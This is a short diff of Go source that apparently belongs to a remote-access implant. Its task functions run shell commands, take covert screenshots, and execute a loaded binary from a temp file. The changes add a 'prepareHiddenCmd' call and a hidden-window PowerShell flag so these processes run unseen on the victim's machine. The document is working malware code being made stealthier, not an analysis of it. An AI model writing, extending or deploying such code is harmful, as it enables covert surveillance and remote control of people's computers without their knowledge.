@@ -729,6 +729,7 @@ func runWithTimeout(cmdStr string, timeoutSec int) (string, error) {
 		timeoutSec = 60
 	}
 	cmd := exec.Command(shellByOS(), shellFlag(), cmdStr)
+	prepareHiddenCmd(cmd)
 	cwdMu.Lock()
 	cmd.Dir = currentCwd
 	cwdMu.Unlock()
@@ -959,7 +960,7 @@ func taskScreenshot() (string, string, string, string) {
 		b64Out, err = runWithTimeout("import -window root /tmp/.cs_ss.png 2>/dev/null && base64 /tmp/.cs_ss.png && rm -f /tmp/.cs_ss.png", 30)
 	case "windows":
 		ps := `Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location,[System.Drawing.Point]::Empty,$b.Size); $m=New-Object IO.MemoryStream; $b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray())`
-		b64Out, err = runWithTimeout(fmt.Sprintf("powershell -NoProfile -NonInteractive -Command \"%s\"", ps), 30)
+		b64Out, err = runWithTimeout(fmt.Sprintf("powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", ps), 30)
 	default:
 		return "", "", "", "screenshot not supported on " + runtime.GOOS
 	}
@@ -1200,6 +1201,7 @@ func taskLoadAssembly(payload map[string]interface{}) (string, string, string, s
 		cmdArgs = strings.Fields(args)
 	}
 	cmd := exec.Command(tmpFile, cmdArgs...)
+	prepareHiddenCmd(cmd)
 	cwdMu.Lock()
 	cmd.Dir = currentCwd
 	cwdMu.Unlock()
